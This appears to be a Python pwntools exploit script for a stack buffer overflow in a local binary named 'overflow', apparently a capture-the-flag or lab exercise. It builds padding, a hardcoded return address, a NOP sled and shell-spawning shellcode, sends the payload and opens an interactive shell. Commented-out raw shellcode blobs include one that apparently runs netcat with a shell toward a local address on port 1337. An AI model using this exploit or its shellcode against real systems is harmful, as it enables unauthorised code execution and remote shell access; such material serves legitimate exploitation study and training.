import struct
from pwn import *
filename = "./overflow"

p = process(filename)
elf = ELF(filename)

junk = b"A"*20
stack = p64(0x7fffffffed00);
nopchain = b"\x90" *20

#shellcode = b"\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11\x41\x59\x52\x51\x53\x41\x52\x41\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
#shellcode =b"\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x03\x03\x03\x03\xbb\x09\x01\x03\x02\x31\xc3\x53\x66\x68\xff\xf0\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
print(shellcode)

exploit = junk + stack + nopchain + shellcode

f = open("shellcode", "wb")
f.write(exploit)

p.sendline(exploit)
p.interactive()
#print(junk + stack + nopchain + shellcode)

